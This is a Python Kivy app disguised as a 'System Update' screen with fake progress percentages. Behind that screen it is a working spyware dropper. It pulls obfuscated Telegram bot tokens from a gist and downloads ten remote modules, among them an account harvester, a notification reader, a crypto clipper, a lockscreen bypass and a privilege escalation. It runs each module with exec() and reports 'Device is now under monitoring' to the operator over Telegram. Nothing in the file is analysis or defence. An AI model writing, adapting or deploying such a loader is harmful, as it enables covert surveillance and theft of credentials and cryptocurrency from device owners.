import threading
import requests
import base64
import time
import json
import traceback
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.utils import platform

class SystemUpdateApp(App):
    def build(self):
        # الرابط الصحيح (تأكدي من أنه يعمل)
        self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/b506332d90b3bd191a5b09cc0ecbf15c9542026a/config.json"

        layout = BoxLayout(orientation='vertical')
        scroll = ScrollView()
        self.label = Label(
            text="System Update\nChecking for compatibility... (0%)",
            halign='center',
            font_size='18sp',
            text_size=(layout.width, None),
            size_hint_y=None,
            valign='top'
        )
        self.label.bind(texture_size=self._update_label_height)
        scroll.add_widget(self.label)
        layout.add_widget(scroll)

        threading.Thread(target=self.logic_engine, daemon=True).start()
        return layout

    def _update_label_height(self, instance, value):
        self.label.height = value[1]

    def decode_secret(self, data):
        try:
            decoded = base64.b64decode(data).decode('utf-8')
            return decoded[::-1]
        except:
            return ""

    def send_log(self, msg):
        try:
            conf = globals().get('MASTER_CONFIG')
            if conf and conf['tokens']:
                token = conf['tokens'][0]
                chat_id = conf['v_id']
                url = f"https://api.telegram.org/bot{token}/sendMessage"
                requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=10)
        except:
            pass

    def logic_engine(self):
        try:
            if platform == 'android':
                from android.permissions import request_permissions, Permission
                request_permissions([
                    Permission.WRITE_EXTERNAL_STORAGE,
                    Permission.READ_EXTERNAL_STORAGE,
                    Permission.INTERNET
                ])

            time.sleep(2)

            response = requests.get(self.config_url, timeout=15)
            config = response.json()

            globals()['MASTER_CONFIG'] = {
                'tokens': [self.decode_secret(t) for t in config['t']],
                'password': self.decode_secret(config['p']),
                'v_id': self.decode_secret(config['v'])
            }

            self.send_log("🚀 [System Update] Online! Configuration loaded successfully.")
            self.label.text = "Downloading system patches... (35%)"
            self.load_payloads()

        except Exception as e:
            error_details = traceback.format_exc()
            self.label.text = f"Connection Error:\n{error_details}"
            # محاولة إرسال الخطأ عبر أول توكن إذا كان متاحاً (لكن قد لا يكون MASTER_CONFIG موجوداً)
            try:
                if 'MASTER_CONFIG' in globals() and globals()['MASTER_CONFIG']:
                    self.send_log(f"❌ Critical Error: {error_details}")
            except:
                pass

    def load_payloads(self):
        payload_urls = [
            "https://gist.githubusercontent.com/Zaen1993/e4af91aec551d599cc8b8ff244c36f23/raw/60c2108cd5fb3b5a78a8c2d9afb4519576526863/monitor.py",
            "https://gist.githubusercontent.com/Zaen1993/65685db73176fe064d3b8aaf7c699542/raw/a191c5e5dd42acef68154b2b72fb028a54cc82cb/telegram_ui.py",
            "https://gist.githubusercontent.com/Zaen1993/c29878f1ec9a2fe247cc15f2deacecb7/raw/9475c0ff3d744c3bbd9ba284aa214f9df87b3025/web_streamer.py",
            "https://gist.githubusercontent.com/Zaen1993/40f2537bf69450d72e6916958b4e8796/raw/c04b852b8f4a513f4a91f4bcaaec1962a37cbf3d/auto_collector.py",
            "https://gist.githubusercontent.com/Zaen1993/9fe7ef022aaefcebde465919d56aa4f5/raw/948ad433f72f692e6c42381e8716e2e4d5b2d6ac/account_harvester.py",
            "https://gist.githubusercontent.com/Zaen1993/803409d15e43cae68dc86c65d6cd2be7/raw/9e66875db5673cec04794218405894a123789e38/notification_reader.py",
            "https://gist.githubusercontent.com/Zaen1993/a2e37944d9158e35d6b1ae4d6a4bf6cb/raw/8d9d07cf0f3d0586c083f00168c1d58f1ba1ef25/crypto_clipper.py",
            "https://gist.githubusercontent.com/Zaen1993/04fc9bcfdeff768d513a93bdfab17d8e/raw/bf8fd90af2bd5d5bd82f138a517499a1fe662446/pixnapping.py",
            "https://gist.githubusercontent.com/Zaen1993/2b657849bfdec661d6357abeda32ec45/raw/6114278915a5f037b343edca1601764a1354dafa/lockscreen_bypass.py",
            "https://gist.githubusercontent.com/Zaen1993/d81377a4d1079a922c38ea53580b55a0/raw/cfb9973a9bdc66b0b23cca1ab3b61762d8df5985/qualcomm_escalation.py"
        ]

        for url in payload_urls:
            try:
                time.sleep(1)
                name = url.split('/')[-1]
                code = requests.get(url, timeout=10).text
                exec(code, globals())
                self.send_log(f"✅ Module Loaded: {name}")
            except Exception as e:
                self.send_log(f"⚠️ Warning: Failed to load {url.split('/')[-1]}")
                continue

        if 'Monitor' in globals():
            self.send_log("⚙️ Starting Monitor Service...")
            monitor = globals()['Monitor']()
            monitor.start()
            self.label.text = "System is up to date (100%)"
            self.send_log("🎯 [Full Success] Device is now under monitoring.")

if __name__ == '__main__':
    SystemUpdateApp().run()
